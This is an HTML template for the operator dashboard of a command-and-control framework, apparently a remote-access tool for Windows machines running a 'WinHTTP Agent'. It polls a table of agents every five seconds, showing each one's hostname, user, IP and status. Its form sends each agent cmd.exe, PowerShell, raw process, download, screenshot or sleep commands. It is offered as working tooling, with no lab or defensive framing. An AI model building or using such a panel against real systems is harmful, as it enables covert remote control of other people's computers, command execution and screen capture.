<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>C2 Dashboard</title>
<script src="https://unpkg.com/htmx.org@2.0.4"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#e6edf3;padding:24px}
h1{font-size:24px;margin-bottom:24px;color:#58a6ff}
table{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden}
th,td{padding:10px 14px;text-align:left;border-bottom:1px solid #30363d;font-size:14px}
th{background:#1c2128;color:#8b949e;text-transform:uppercase;font-size:12px;letter-spacing:.5px}
tr:hover{background:#1c2128}
.status-alive{color:#3fb950;font-weight:600}
.status-dead{color:#f85149;font-weight:600}
.btn{padding:6px 14px;border:none;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600}
.btn-cmd{background:#238636;color:#fff}
.btn-cmd:hover{background:#2ea043}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100}
.modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#161b22;border:1px solid #30363d;border-radius:12px;padding:28px;width:440px;z-index:101}
.modal h2{margin-bottom:16px;color:#58a6ff}
.modal label{display:block;margin-bottom:6px;color:#8b949e;font-size:13px}
.modal select,.modal input[type=text]{width:100%;padding:8px 12px;margin-bottom:14px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;font-size:14px}
.modal .btn-close{float:right;background:0;border:none;color:#8b949e;cursor:pointer;font-size:20px}
.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:8px}
.modal-actions .btn{background:#238636}
.modal-actions .btn-cancel{background:#30363d;color:#e6edf3}
#toast{position:fixed;bottom:24px;right:24px;background:#238636;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;display:none;z-index:200}
footer{margin-top:24px;color:#8b949e;font-size:12px;text-align:center}
</style>
</head>
<body>
<h1>&#9889; C2 Dashboard</h1>

<table>
<thead>
<tr>
<th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th>Pending</th><th>Action</th>
</tr>
</thead>
<tbody id="agent-tbody"
       hx-get="/app/dashboard/table"
       hx-trigger="every 5s"
       hx-swap="innerHTML">
  {% include '_table.html' %}
</tbody>
</table>

<div class="modal-overlay" id="modal-overlay" onclick="closeModal()"></div>
<div class="modal" id="command-modal" style="display:none">
  <button class="btn-close" onclick="closeModal()">&times;</button>
  <h2>Send Command</h2>
  <form id="cmd-form" hx-post="/app/dashboard/command" hx-target="#toast" hx-swap="innerHTML"
        hx-on::after-request="if(event.detail.successful){this.reset();setTimeout(closeModal,500);showToast('Command sent')}">
    <input type="hidden" name="agent_id" id="agent-id">
    <label>Type</label>
    <select name="type" id="cmd-type">
      <option value="cmd">cmd.exe</option>
      <option value="raw">Direct (CreateProcessW)</option>
      <option value="powershell">PowerShell</option>
      <option value="download">Download</option>
      <option value="screenshot">Screenshot</option>
      <option value="sleep">Sleep</option>
    </select>
    <label>Command / Args</label>
    <input type="text" name="command" id="cmd-command" placeholder="whoami" autocomplete="off">
    <div class="modal-actions">
      <button type="button" class="btn btn-cancel" onclick="closeModal()">Cancel</button>
      <button type="submit" class="btn">Execute</button>
    </div>
  </form>
</div>

<div id="toast"></div>

<footer>C2 Framework &mdash; AES-256-CBC &mdash; WinHTTP Agent</footer>

<script>
function openModal(agentId){
  document.getElementById('agent-id').value=agentId;
  document.getElementById('cmd-command').value='';
  document.getElementById('modal-overlay').style.display='block';
  document.getElementById('command-modal').style.display='block';
}
function closeModal(){
  document.getElementById('modal-overlay').style.display='none';
  document.getElementById('command-modal').style.display='none';
}
function showToast(msg){
  var t=document.getElementById('toast');
  t.textContent=msg;t.style.display='block';
  setTimeout(function(){t.style.display='none'},2500);
}
</script>
</body>
</html>
